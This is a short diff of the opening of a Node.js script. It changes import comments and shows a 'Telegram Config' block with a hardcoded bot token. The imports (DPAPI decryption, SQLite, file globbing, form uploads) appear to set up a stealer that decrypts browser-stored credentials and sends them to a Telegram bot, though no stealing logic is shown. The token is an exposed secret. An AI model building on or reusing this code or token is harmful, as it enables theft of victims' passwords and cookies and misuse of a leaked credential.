@@ -1,11 +1,11 @@
 const fs = require('fs');
 const path = require('path');
-const os = require('os');
+const os = require('os');             // ✅ only once
 const sqlite3 = require('sqlite3').verbose();
-const fetch = require('node-fetch'); // npm install node-fetch@2
-const FormData = require('form-data'); // npm install form-data
-const dpapi = require('dpapi'); // npm install dpapi
-const glob = require('glob'); // npm install glob
+const fetch = require('node-fetch');  
+const FormData = require('form-data'); 
+const dpapi = require('dpapi');       
+const glob = require('glob');  
 
 // Telegram Config
 const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
